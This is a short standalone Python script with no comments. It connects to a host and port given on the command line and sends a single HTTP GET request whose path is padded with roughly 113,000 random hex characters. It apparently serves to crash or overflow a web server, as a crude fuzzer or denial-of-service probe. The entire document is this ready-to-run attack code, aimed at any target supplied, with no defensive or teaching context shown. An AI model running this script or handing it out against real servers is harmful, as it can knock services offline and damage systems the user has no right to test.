from python_random_strings import random_strings
import sys, socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))

buff = "GET "
buff += random_strings.random_hexdigits(90)*90
buff += random_strings.random_hexdigits(90)*90
buff += random_strings.random_hexdigits(90)*90
buff += random_strings.random_hexdigits(90)*90
buff += random_strings.random_hexdigits(90)*90
buff += random_strings.random_hexdigits(90)*90
buff += random_strings.random_hexdigits(90)*90
buff += random_strings.random_hexdigits(90)*90
buff += random_strings.random_hexdigits(90)*90
buff += random_strings.random_hexdigits(90)*90
buff += random_strings.random_hexdigits(90)*90
buff += random_strings.random_hexdigits(90)*90
buff += random_strings.random_hexdigits(90)*90
buff += random_strings.random_hexdigits(90)*90
buff += " HTTP/1.1\r\n\r\n"

s.send(buff.encode('raw_unicode_escape'))
s.close()